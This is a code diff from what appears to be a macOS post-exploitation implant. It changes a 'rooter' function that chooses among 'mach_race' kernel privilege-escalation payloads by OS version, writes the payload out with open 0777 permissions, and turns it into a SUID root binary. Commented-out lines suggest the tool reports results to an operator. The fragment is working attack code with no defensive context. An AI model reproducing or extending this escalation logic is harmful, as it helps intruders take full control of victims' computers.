@@ -1695,9 +1695,11 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 		if sys_vers == ("10.11.5") or sys_vers == ("10.11.6") or sys_vers == ("10.12") or sys_vers == ("10.12.1"):
 			payload = readDB('mach_race', True).split('     ')[1]
 			#send_msg('Mach race >=10.11.5 ' + '\n', False)
-		else:
+		elif sys_vers.startswith("10.10"): #yosemite only because of location of mach kernel
 			payload = readDB('mach_race', True).split('     ')[0]
 			#send_msg('Mach race <10.11.5\n', False)
+		else: #<=10.9
+			payload = readDB('mach_race', True).split('     ')[2]
 		root_escalate = payload_generator(payload)
 		os.chmod(root_escalate, 0777)
 		binarymake = make_SUID_root_binary(None, root_escalate)
